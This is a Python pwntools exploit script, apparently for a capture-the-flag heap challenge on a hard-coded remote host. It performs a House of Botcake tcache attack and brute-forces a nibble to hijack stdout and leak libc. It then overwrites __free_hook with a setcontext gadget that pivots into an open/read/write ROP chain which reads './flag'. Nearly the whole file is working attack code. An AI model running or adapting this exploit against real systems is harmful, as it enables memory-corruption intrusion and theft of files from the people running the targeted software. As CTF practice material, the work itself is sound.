#!/usr/bin/env python3
from pwn import *
import time

import sys

context(arch='amd64', os='linux', log_level='info')

STDOUT_OFF    = 0x1ed6a0
FREE_HOOK_OFF = 0x1eee48
MAGIC_OFF     = 0x151bb0
SETCTX61_OFF  = 0x54f5d
POP_RDI       = 0x23b6a
POP_RSI       = 0x2601f
POP_RDX_RBX   = 0x15fae6
POP_RAX       = 0x36174
SYSCALL_RET   = 0x630a9
RET           = 0x22679

HOST = '39.96.193.120'
PORT = 10011


def exploit(nib):
    log.info(f"=== nibble {nib:#x} ===")
    t = remote(HOST, PORT, timeout=30)

    # ====== 基础交互函数 ======
    def add(idx, sz, data=b'A'):
        t.sendlineafter(b'Choice: ', b'1')
        t.sendlineafter(b'Index: ', str(idx).encode())
        t.sendlineafter(b'Size: ', str(sz).encode())
        t.sendafter(b'Content: ', data.ljust(sz, b'\x00')[:sz])

    def delete(idx):
        t.sendlineafter(b'Choice: ', b'2')
        t.sendlineafter(b'Index: ', str(idx).encode())

    def edit(idx, data):
        t.sendlineafter(b'Choice: ', b'3')
        t.sendlineafter(b'Index: ', str(idx).encode())
        t.sendafter(b'Content: ', data)

    def ex(sz):
        """exhaust: if Content doesn't appear, re-sync"""
        t.sendlineafter(b'Choice: ', b'1')
        t.sendlineafter(b'Index: ', b'15')
        t.sendlineafter(b'Size: ', str(sz).encode())
        t.send(b'A' * sz)
        t.recvuntil(b'Choice: ')

    try:
        # ---- Phase 1: Exhaust ----
        # 只用大块来推开 top chunk (小 size 容易 fill tcache)
        for _ in range(60):
            ex(0x400)   # malloc(1024) = 0x410 chunk

        # ---- Botcake ----
        add(0, 0x88); add(1, 0x98); add(3, 0x20); add(2, 0x98)

        for i in range(4, 11): add(i, 0x98)
        for i in range(4, 11): delete(i)
        for i in range(4, 11): add(i, 0x88)
        for i in range(4, 11): delete(i)

        delete(0); delete(1)
        for i in range(4, 11): add(i, 0x98)
        delete(2); delete(1)
        for i in range(4, 11): add(i, 0x88)

        add(0, 0x88)

        # ---- Leak ----
        edit(1, p16((nib << 12) | 0x6a0))
        add(1, 0x98)

        t.sendlineafter(b'Choice: ', b'1')
        t.sendlineafter(b'Index: ', b'0')
        t.sendlineafter(b'Size: ', b'152')
        t.sendafter(b'Content: ', p64(0xfbad1800) + p64(0) * 3 + b'\x00')

        time.sleep(1.5)
        leaked = t.clean(timeout=4)

        libc_base = 0
        for i in range(len(leaked) - 7):
            v = u64(leaked[i:i+8])
            if (v >> 40) == 0x7f:
                for off in [0x1ec980, 0x1ecbe0, 0x1ed6a0, 0x1ed5c0, 0x1ed4a0]:
                    c = v - off
                    if c > 0 and (c & 0xfff) == 0:
                        libc_base = c; break
                if libc_base: break

        if not libc_base:
            log.warning(f"leak fail ({len(leaked)}B)"); t.close(); return None
        log.success(f"libc @ {hex(libc_base)}")

        # ---- Phase 2: __free_hook -> ORW ----
        fh = libc_base + FREE_HOOK_OFF
        mg = libc_base + MAGIC_OFF
        sc = libc_base + SETCTX61_OFF
        rt = libc_base + RET
        rop_s = fh + 0xb8
        fl_s  = fh + 0x190
        rd_b  = fh + 0x300

        chain  = p64(libc_base + POP_RDI) + p64(fl_s)
        chain += p64(libc_base + POP_RSI) + p64(0)
        chain += p64(libc_base + POP_RAX) + p64(2)
        chain += p64(libc_base + SYSCALL_RET)
        chain += p64(libc_base + POP_RDI) + p64(3)
        chain += p64(libc_base + POP_RSI) + p64(rd_b)
        chain += p64(libc_base + POP_RDX_RBX) + p64(0x100) + p64(0)
        chain += p64(libc_base + POP_RAX) + p64(0)
        chain += p64(libc_base + SYSCALL_RET)
        chain += p64(libc_base + POP_RDI) + p64(1)
        chain += p64(libc_base + POP_RSI) + p64(rd_b)
        chain += p64(libc_base + POP_RDX_RBX) + p64(0x100) + p64(0)
        chain += p64(libc_base + POP_RAX) + p64(1)
        chain += p64(libc_base + SYSCALL_RET)

        # R1: fh+0x110
        delete(4); delete(5)
        edit(5, p64(fh + 0x110) + b'\x00' * (0x88 - 8))
        add(4, 0x88, b'\x00' * 0x88)
        b1 = bytearray(0x88)
        b1[0:len(chain[88:])] = chain[88:]
        b1[0x80:0x87] = b'./flag\x00'
        add(5, 0x88, bytes(b1))

        # R2: fh+0x88
        delete(6); delete(7)
        edit(7, p64(fh + 0x88) + b'\x00' * (0x88 - 8))
        add(6, 0x88, b'\x00' * 0x88)
        b2 = bytearray(0x88)
        b2[0x20:0x28] = p64(rop_s)
        b2[0x28:0x30] = p64(rt)
        b2[0x30:0x30 + 88] = chain[:88]
        add(7, 0x88, bytes(b2))

        edit(10, p64(0) + p64(fh + 8) + b'\x00' * (0x88 - 16))

        # R3: __free_hook
        delete(8); delete(9)
        edit(9, p64(fh) + b'\x00' * (0x88 - 8))
        add(8, 0x88, b'\x00' * 0x88)
        b3 = bytearray(0x88)
        b3[0:8] = p64(mg)
        b3[0x28:0x30] = p64(sc)
        add(9, 0x88, bytes(b3))

        time.sleep(0.3)
        delete(10)

        # ---- Phase 3: flag ----
        time.sleep(2)
        r = t.recv(timeout=8)
        t.close()
        if r:
            log.success(f"OUTPUT: {r.decode(errors='replace')}")
            return r.decode(errors='replace')
        log.warning("no output")
        return ''

    except Exception as e:
        log.warning(f"error: {type(e).__name__}: {e}")
        try: t.close()
        except: pass
        return None


def main():
    for nib in range(16):
        r = exploit(nib)
        if r:
            log.success(f"\n===== FLAG: {r} =====")
            return
        time.sleep(1)
    log.error("no flag")

if __name__ == '__main__':
    main()
